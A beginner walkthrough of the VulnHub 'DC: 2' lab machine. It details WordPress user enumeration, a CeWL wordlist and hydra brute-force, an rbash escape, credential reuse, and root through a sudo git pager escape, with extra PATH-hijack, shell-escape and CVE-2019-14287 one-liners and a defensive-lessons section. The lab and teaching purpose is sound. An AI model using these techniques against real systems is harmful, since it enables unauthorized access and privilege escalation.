# DC: 2 — VulnHub Walkthrough (Beginner Friendly)

> Educational, step-by-step walkthrough for students. This is the second machine in
> the **DC** series by DCAU. It is intentionally vulnerable and must only ever be
> run on an isolated lab network.

| Field | Value |
| --- | --- |
| **Machine** | DC: 2 |
| **Difficulty** | Beginner |
| **Author** | DCAU |
| **Released** | 22 March 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/dc-2,311/> |
| **Download** | <https://vulnhub.com/entry/dc-2,311/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux — Debian (Apache 2.4.10 + WordPress, OpenSSH on a non-standard port) |

> **Note:** exact banners, ports and file contents can differ slightly between the
> VirtualBox and VMware builds of this box ("varies by build"). The attack *chain*
> below is stable; small details (a service version, a password) may move around.
> When in doubt, re-run the enumeration yourself.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a target on an isolated lab network and set up a **hostname** (`dc-2`) that the app needs.
- How to spot **WordPress** and enumerate it properly with **wpscan**.
- How to read a machine's own hints (flag 1) and turn them into an action plan.
- How to build a **custom wordlist** with **CeWL** and use it for credential attacks.
- Why default wordlists (`rockyou.txt`) are not always enough.
- How to find **SSH on a non-standard port** and log in with reused credentials.
- How to escape a **restricted shell (`rbash`)** using `vi` and a `PATH` fix.
- How to pivot between users with `su`, and abuse a **`sudo git`** rule for root (GTFOBins).

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import the OVA, and have the target on the **same host-only/NAT** subnet as Kali.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network. The target
> boots with DHCP, so its IP can change every time you import it — always confirm.

First look at your own interface to learn the subnet.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** the `inet 192.168.56.10/24` line means *you* are on the
> `192.168.56.0/24` network, so the target will share the first three numbers.

Sweep the subnet for live hosts.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:ab:cd:ef, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts
192.168.56.10    08:00:27:ab:cd:ef   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:12:34:56   PCS Systemtechnik GmbH
```

> **Why it works:** `arp-scan` asks every address "who has this IP?" over ARP and
> lists whoever answers. ARP is fast and generally can't be hidden by a firewall.

**Target IP:** `192.168.56.101`

![Finding the target with arp-scan](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00048s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
7744/tcp open  ssh
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

```bash
sudo nmap -sC -sV -p 80,7744 -oA scans/services 192.168.56.101
```

```text
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.7.3
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-title: DC-2
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

> **How to read it:** `-p-` scans all TCP ports, `-sV` identifies service versions
> and `-sC` runs safe default scripts. Two attack surfaces this time: a **WordPress
> site on 80**, and **SSH deliberately moved to port 7744** (the standard port 22
> is closed). The site title is `DC-2`, which is also the hostname the app expects.

### 2.2 Add the hostname the app requires

DC-2's WordPress is configured for the hostname `dc-2`. Without it, parts of the
site break (redirects fail). Add a hosts entry:

```bash
echo "192.168.56.101 dc-2" | sudo tee -a /etc/hosts
```

```text
192.168.56.101 dc-2
```

> **Why it works:** the file `/etc/hosts` lets your machine resolve the name
> `dc-2` to the target IP locally, no DNS server required. Now `http://dc-2/`
> behaves exactly as the WordPress install expects.

### 2.3 Meet the app and read Flag 1

Browse `http://dc-2/` in a browser (or with `curl`):

```bash
curl -s http://dc-2/ | grep -i -A2 "flag"
curl -s http://dc-2/index.php/flag/
```


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```text
Flag 1: Your usual wordlists probably won't work, so instead, maybe you
just need to cewl more? ...
(Hint: log in as one user, and if you can't get in, try another.)
```

> **Why it works:** the box hands us a hint on the `/flag/` page. It says the usual
> wordlists likely *won't* work and to "**cewl** more" — a deliberate nudge toward
> the **CeWL** tool, which builds a wordlist from the words on the target website.

![WordPress site and Flag 1](images/02-nmap.png)

### 2.4 Enumerate WordPress users with wpscan


> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://dc-2/ --enumerate u --disable-tls-checks
```

```text
[+] URL: http://dc-2/
[+] WordPress version 4.7.3 identified
[+] Enumerating Users ...
[i] User(s) Identified:
[+] admin
[+] tom
[+] jerry
```

> **Why it works:** WordPress leaks usernames through the author archive feature
> (`/?author=1`). `wpscan -e u` walks those IDs and reveals three users: `admin`,
> `tom` and `jerry`. We now have the "who"; we still need the "what" (passwords).

### 2.5 Build a custom wordlist with CeWL

```bash
cewl -w dc2-passwords.txt -d 2 -m 5 http://dc-2/
wc -l dc2-passwords.txt
```

```text
142 dc2-passwords.txt
```

> **Why it works:** CeWL crawls the site and collects every word of a minimum
> length (`-m 5`) to a chosen depth (`-d 2`). Because the passwords on this box are
> ordinary words that appear in the site's own text, the site content *is* the
> wordlist — that is why `rockyou.txt` alone fails here.

---

## 3. Foothold

### 3.1 Brute-force WordPress logins

Use the WordPress login flow and our custom wordlist. We can brute-force with
`wpscan` (one user at a time) or `hydra` (all users at once):

```bash
wpscan --url http://dc-2/ --passwords dc2-passwords.txt \
       --usernames admin,tom,jerry --disable-tls-checks
```

Or with `hydra`:


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)

```bash
hydra -L users.txt -P dc2-passwords.txt dc-2 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:S=Dashboard"
```

```text
[SUCCESS] - tom / parturient
[SUCCESS] - jerry / adipiscing
```

> **Why it works:** both tools submit username/password pairs to the login form.
> `hydra` watches for the string `Dashboard` in the response — that text only
> appears when a login succeeds. We recover **`tom:parturient`** and
> **`jerry:adipiscing`**. The `admin` password is deliberately uncrackable with
> this list, which links back to the hint: "if you can't get in, try another [user]."

### 3.2 Flag 2 — inside WordPress

Log in at `http://dc-2/wp-login.php` as **jerry**, then open the **Flag** menu item
in the dashboard.

```text
Flag 2: If you're lucky enough to find us, we're not in the habit of giving
out hints. Oh, wait, we are! You don't need to exploit WordPress to get in.
There is a better way ... (a service on another port)
```

> **Why it matters:** the hint tells us to stop attacking WordPress and look for a
> different entry point — the **SSH service on port 7744** we found in the Nmap
> scan. Reusing the WordPress credentials against SSH is the intended pivot.

![Flag 2 in the WordPress dashboard](images/03-enum.png)

### 3.3 SSH in and escape the restricted shell

Try the credentials over SSH on the non-standard port. `jerry`'s login is rejected,
but `tom` works — and lands us in a **restricted shell (`rbash`)** where most
commands (including `cd`, `cat`) are blocked.

```bash
ssh tom@192.168.56.101 -p 7744
# password: parturient
```


> ### 📖 Concept — Escaping a restricted shell
>
> **`rbash`** (restricted bash) is bash started with `--restricted`. It blocks:
> changing directory (`cd`), setting or unsetting `SHELL`/`PATH`/`ENV`/`BASH_ENV`,
> command names containing `/`, output redirection with `>`, and `exec`/`source` of
> absolute paths.
>
> It is a *shell* restriction, not a security boundary — it only constrains that one
> process. **Anything that spawns a fresh shell escapes it.** Work through these:
>
> ```bash
> # 1. Does any permitted command spawn a shell?
> vim -c ':!sh'            # or :set shell=/bin/bash  then :shell
> less /etc/passwd         # then type !sh
> more, man (then !sh), ftp (!/bin/sh), gdb (-ex '!sh'), awk ('BEGIN{system("/bin/sh")}')
> find . -exec /bin/sh \; -quit
>
> # 2. Can you run an interpreter at all?
> python -c 'import os; os.system("/bin/sh")'
> perl -e 'exec "/bin/sh";'
> php -r "system('/bin/sh');"
>
> # 3. Is SSH available with a command override?
> ssh user@target -t "/bin/sh"          # -t forces a tty, bypassing the login shell
> ssh user@target -t "bash --noprofile --norc"
>
> # 4. Is the restriction only in the profile?
> bash --noprofile --norc               # a clean, unrestricted bash
> export SHELL=/bin/bash                # if you can reach env at all
>
> # 5. Can you write a file and execute it another way?
> echo '/bin/sh' > /tmp/x.sh            # redirection is often blocked — try tee
> ```
>
> **Check what you actually have first.** `echo $0` shows the shell; `set -o` lists
> options (look for `restricted on`); `echo $PATH` shows whether it is pinned;
> `compgen -c | head -50` lists runnable commands.
>
> **The general principle:** a restricted shell limits *one process*. Find any child
> process it lets you create, and the restriction does not apply there.
>
> **Deep dive:** [CONCEPTS §12 — Shells](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```text
tom@DC-2:~$ whoami
-rbash: whoami: command not found
```

> **Why it works:** `rbash` (restricted bash) limits us to a locked-down set of
> commands. But it still lets us run programs it trusts — including `vi`. We can
> break out of `vi` into a normal shell.

```text
tom@DC-2:~$ vi
:set shell=/bin/sh
:shell
```


> ### 📖 Concept — PATH hijacking
>
> When a program runs another program **by name only** (`service`, `tar`, `python`)
> rather than by absolute path, the shell searches each directory in `$PATH` **left to
> right** and executes the first match it finds. If you can place a file earlier in
> that search order, you control what runs.
>
> This matters when the calling program is **root-owned** — a cron job, a SUID binary,
> or a startup script:
>
> ```bash
> mkdir -p /tmp/evil
> printf '#!/bin/sh\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\n' > /tmp/evil/service
> chmod +x /tmp/evil/service
> export PATH=/tmp/evil:$PATH
> # wait for the root job to run, then:
> /tmp/rootbash -p
> ```
>
> **Find the opportunity** by inspecting what the privileged program actually calls:
>
> ```bash
> strace -f -e trace=execve /usr/local/bin/script.sh 2>&1 | grep execve
> strings /usr/local/bin/script.sh | grep -E 'system\(|popen\(|exec'
> ```
>
> An `execve("service", ...)` with **no leading `/`** is the vulnerability. A fully
> qualified `/usr/sbin/service` is not.
>
> **Check cron's own PATH first** — `/etc/crontab` usually sets
> `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`, and
> `sudo`'s `secure_path` overrides yours entirely. If `/tmp` cannot get into that
> list, look instead for a writable directory that is *already* in it —
> `/usr/local/bin` very often is.
>
> **Deep dive:** [CONCEPTS §15.8 — PATH hijacking](../../docs/CONCEPTS.md#158-path-hijacking)

```text
tom@DC-2:~$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
tom@DC-2:~$ whoami
tom
```

> **Why it works:** inside `vi`, `:set shell=/bin/sh` tells `vi` which program to
> launch, and `:shell` launches it. The restricted environment often strips `/bin`
> from `PATH`, so we export a normal `PATH` and our commands work again.

### 3.4 Flag 3 — and a hint to pivot users

```bash
ls -la /home/tom
cat /home/tom/flag3.txt
```

```text
Flag 3: Poor old Tom is always running after Jerry. Perhaps he should
su for all the stress he causes.
```

> **Why it matters:** "su" is both a pun and an instruction: switch to the user
> **jerry** using `su`. We already have jerry's password (`adipiscing`) from the
> WordPress brute-force — a classic example of **password reuse across services**.

![SSH shell and Flag 3](images/04-foothold.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Become jerry

```bash
su jerry
# password: adipiscing
whoami
id
```

```text
jerry
uid=1000(jerry) gid=1000(jerry) groups=1000(jerry),100(users)
```

```bash
cat /home/jerry/flag4.txt
```

```text
Flag 4: Good to see that you've made it this far, but can you make it
to the very end? ... hint: git
```

> **Why it matters:** flag 4 points at `git` — a nudge toward a `sudo` rule. Let's
> check jerry's sudo rights.

### 4.2 Read jerry's sudo rights


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```

> **Why it works:** `sudo -l` lists what the current user may run as another user
> (here, **root, with no password**). Jerry is allowed to run `git` as root. `git`
> has a documented escape that runs a shell — this is a textbook
> [GTFOBins](https://gtfobins.github.io/gtfobins/git/) privilege escalation.

### 4.3 Root via GTFOBins `git`

`git` uses a "pager" to display long output. If we make `git` show help through its
own interactive pager, we can break out of that pager into a shell — and because we
ran `git` with `sudo`, that shell is **root**.

```bash
sudo git -p help config
```

```text
... (long config documentation; git opens it in a pager) ...
```

At the pager prompt, type this (the leading `!` runs a shell command):

```text
!/bin/sh
```

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** `git help` normally invokes `man`, which invokes a pager
> (`less`). `less` can run shell commands with `!`. Since the whole chain was
> started via `sudo`, the command runs as root. GTFOBins documents this for `git`.

### The final flag

```bash
cat /root/flag5.txt
```

```text
... you've got root ... congratulations!
```

![Privilege escalation to root and final flag](images/05-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | WordPress user enumeration | `http://dc-2/` (`?author=`) | Leaks valid usernames (`admin`, `tom`, `jerry`) |
| 2 | Weak/guessable passwords discoverable from site content | `/wp-login.php`, SSH 7744 | Credential compromise via CeWL + brute-force |
| 3 | Password reuse across services | WordPress → SSH | WordPress passwords log in over SSH (`tom`) |
| 4 | Restricted shell is escapable | `rbash` via `vi` | Break out to a normal shell |
| 5 | Password reuse across users | `tom` → `jerry` via `su` | Lateral movement to the `jerry` account |
| 6 | Over-privileged `sudo` rule | `(root) NOPASSWD: /usr/bin/git` | Root via GTFOBins `git` pager escape |

## 6. Defensive lessons (blue team)

- **Don't leak usernames.** Disable WordPress author archives / `?author=` enumeration
  and avoid publishing account names.
- **Never reuse passwords.** Each service and each user must have a unique,
  randomly generated credential. A WordPress password should never open an SSH session.
- **Block online guessing.** Rate-limit and lock out failed logins (fail2ban,
  MFA) on both the web app and SSH; never expose SSH with password auth if keys are possible.
- **Restrict shells properly.** Don't rely on `rbash` for security — disable login
  for service accounts and use forced commands / `Match User` SSH restrictions
  instead of a shell you hope is "restricted".
- **Least privilege for `sudo`.** Never grant `NOPASSWD` on general-purpose tools
  like `git`, `less`, `vim`, `find` and `tar`. Check rules against
  [GTFOBins](https://gtfobins.github.io/) before approving them.
- **Detection ideas:** alert on high-volume failed logins (web + SSH), on `sudo git`
  invocations, and on shells (`/bin/sh`) spawning as children of `git`/`less`/`man`.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/dc-2,311/>
- WPScan: <https://wpscan.com/>
- CeWL (Custom Word List generator): <https://github.com/digininja/CeWL>
- GTFOBins — `git`: <https://gtfobins.github.io/gtfobins/git/>
- GTFOBins — shell escapes: <https://gtfobins.github.io/>
- Community writeups consulted:
  - [Vulnhub – DC2 Walkthrough — mzfr](https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC2)
  - [vshaliii/DC-2-Vulnhub-Walkthrough (GitHub)](https://github.com/vshaliii/DC-2-Vulnhub-Walkthrough)
  - [DC-2: Vulnhub Walkthrough — Hunterstring (Medium)](https://medium.com/@hunterstring988/dc-2-vulnhub-walkthrough-9f5ea95f5560)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (arp-scan)
- [ ] `images/02-nmap.png` — Nmap scan showing WordPress on 80 and SSH on 7744
- [ ] `images/03-enum.png` — wpscan user enumeration / Flag 1 hint / Flag 2
- [ ] `images/04-foothold.png` — SSH as `tom`, `rbash` escape, Flag 3
- [ ] `images/05-root-flag.png` — `sudo git` root shell and the final flag

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
